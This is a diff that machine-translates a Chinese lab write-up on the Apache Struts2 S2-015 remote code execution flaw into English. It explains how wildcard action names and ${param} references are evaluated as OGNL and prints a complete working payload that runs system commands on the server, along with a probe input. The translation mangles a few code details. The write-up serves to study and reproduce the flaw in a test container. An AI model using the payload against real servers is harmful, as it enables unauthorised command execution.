@@ -1,21 +1,21 @@
-# S2-015 远程代码执行漏洞
+# S2-015 Remote Code Execution Vulnerability
 
-影响版本: 2.0.0 - 2.3.14.2
+Impact version: 2.0.0 - 2.3.14.2
 
-漏洞详情: 
+Vulnerability details:
 
  - http://struts.apache.org/docs/s2-015.html
 
-## 测试环境搭建
+## Test environment construction
 
 ```
-docker-compose build
-docker-compose up -d
+Docker-compose build
+Docker-compose up -d
 ```
 
-## 原理与测试
+## Principles and Testing
 
-漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：
+The vulnerability arises when the Action wildcard * is configured and used as a dynamic value, and its content is evaluated as an OGNL expression, for example:
 
 ```xml
 <package name="S2-015" extends="struts-default">
@@ -25,27 +25,27 @@ docker-compose up -d
 </package>
 ```
 
-上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / " \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。
+The above configuration allows us to use name.jsp to render the page when we access name.action, but when we extract the name and parse it, we perform an OGNL expression parsing, which causes the command to execute. In the practice of recurring, I found that because the location of the name value is special, some special characters such as / " \ can not be used (escaped also not), so when using this point for remote command execution, some commands with a path It may not be successful.
 
-还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的  setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 `#_memberAccess['allowStaticMethodAccess']=true` 来修改其值达到重获静态方法调用的能力。
+It should also be noted that in the update of Struts 2.3.14.1 - Struts 2.3.14.2, the setAllowStaticMethodAccess method in the SecurityMemberAccess class has been removed, so after version 2.3.14.2, you cannot directly pass `#_memberAccess['allowStaticMethodAccess']= True` to modify its value to achieve the ability to regain static method calls.
 
-这里为了到达执行命令的目的可以用 kxlzx 提到的调用动态方法 (new java.lang.ProcessBuilder('calc')).start() 来解决，另外还可以借助 Java 反射机制去间接修改：
+Here in order to reach the execution of the command can be solved by calling the dynamic method (new java.lang.ProcessBuilder('calc')).start() mentioned by kxlzx, and indirectly by means of the Java reflection mechanism:
 
 ```
 #context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true)
 ```
 
-可以构造 Payload 如下：
+You can construct Payload as follows:
 
 ```
-${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#q}
+${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true ),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#q}
 ```
 
-直接回显：
+Direct echo:
 
 ![](01.png)
 
-除了上面所说到的这种情况以外，S2-015 还涉及一种二次引用执行的情况：
+In addition to the above mentioned situation, S2-015 also covers a case of secondary reference execution:
 
 ```xml
 <action name="param" class="com.demo.action.ParamAction">
@@ -56,6 +56,6 @@ ${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.g
 </action>
 ```
 
-这里配置了 `<param name="errorMessage">${message}</param>`，其中 message 为 ParamAction 中的一个私有变量，这样配置会导致触发该 Result 时，Struts2 会从请求参数中获取 message 的值，并在解析过程中，触发了 OGNL 表达式执行，因此只用提交 %{1111*2} 作为其变量值提交就会得到执行。这里需要注意的是这里的二次解析是因为在 struts.xml 中使用 ${param} 引用了 Action 中的变量所导致的，并不针对于 type="httpheader" 这种返回方式。
+Here is configured ``param name="errorMessage">${message}</param>`, where message is a private variable in ParamAction, so configuration will cause Struts2 to get the message from the request parameter when the Result is triggered. The value, and during the parsing process, triggers the OGNL expression execution, so committing only with commit %{1111*2} as its variable value will be executed. The important thing to note here is that the secondary parsing here is caused by using ${param} in struts.xml to reference variables in Action, not for type="httpheader".
 
 ![](02.png)
